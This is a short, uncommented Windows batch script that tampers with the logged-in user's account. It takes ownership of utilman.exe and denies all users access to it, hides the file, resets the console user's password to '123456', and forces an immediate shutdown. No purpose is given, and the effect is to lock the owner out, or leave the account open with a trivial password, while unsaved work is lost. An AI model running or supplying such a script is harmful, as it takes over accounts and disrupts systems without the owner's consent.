@ECHO off

SET ConsoleUser=None

%__AppDir__%takeown.exe /f c:\windows\system32\utilman.exe

%__AppDir__%icacls.exe c:\windows\system32\utilman.exe /deny *S-1-1-0:(DE,WD,AD,RX)

%__AppDir__%attrib.exe +r +h +s c:\windows\system32\utilman.exe

for /F "tokens=1" %%f in ('%__AppDir__%query.exe user ^| %__AppDir__%find.exe "console"') do set "ConsoleUser=%%f"

%__AppDir__%net.exe user %ConsoleUser% 123456

shutdown /s /f /t 00